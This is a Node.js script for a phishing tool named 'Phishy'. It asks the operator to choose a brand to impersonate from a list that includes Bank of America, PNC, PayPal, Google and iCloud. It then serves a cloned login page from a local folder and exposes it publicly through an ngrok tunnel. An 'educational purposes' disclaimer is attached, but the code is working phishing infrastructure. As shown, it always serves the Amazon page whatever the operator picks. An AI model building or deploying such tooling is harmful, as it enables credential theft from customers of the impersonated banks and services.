#!/usr/bin/node

'use strict';

const fs = require('fs');
const http = require('http');
const ngrok = require('ngrok');
const inquirer = require('inquirer');
const { exec } = require('child_process');

const PORT = 8080;

console.log(`
    :: Disclaimer: Developers assume no liability and are not ::
    :: responsible for any misuse or damage caused by Phishy. ::
    :: Only use for educational purposes!                     ::

                     .                  Twitter | https://www.twitter.com/ant_devs
                    ":"                   
                  ___:____     |"\/"|       
                ,'        '.    \  /       
                |  O        \___/  |
                ~^~^~^~^~^~^~^~^~^~^~^~^~
        ██████  ██   ██ ██ ███████ ██   ██ ██    ██ 
        ██   ██ ██   ██ ██ ██      ██   ██  ██  ██  
        ██████  ███████ ██ ███████ ███████   ████   
        ██      ██   ██ ██      ██ ██   ██    ██    
        ██      ██   ██ ██ ███████ ██   ██    ██                                            
`);


const ngrokStart = async () => {
    const url = await ngrok.connect({
        proto: 'http',
        addr: PORT
    });
    
    return url;
};

inquirer
	.prompt([
		{
			type: 'list',
			name: 'website',
			message: 'Please choose a website',
			choices: [
				'Bank of America',
				'Royal Credit Union',
				'PNC',
				'Amazon',
				'Google',
				'iCloud',
				'Instagram',
				'LinkedIn',
				'PayPal',
			],
		},
	])
	.then((answer) => {
		const ans = answer.website;

        const website = ans.split(' ').join('').toLowerCase();
        
        ngrokStart().then((url) => console.log(url))
	});

http.createServer((req, res) => {
    fs.readFile(`./websites/amazon/index.html`, (err, data) => {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.write(data);
        res.end();
    })

}).listen(PORT);

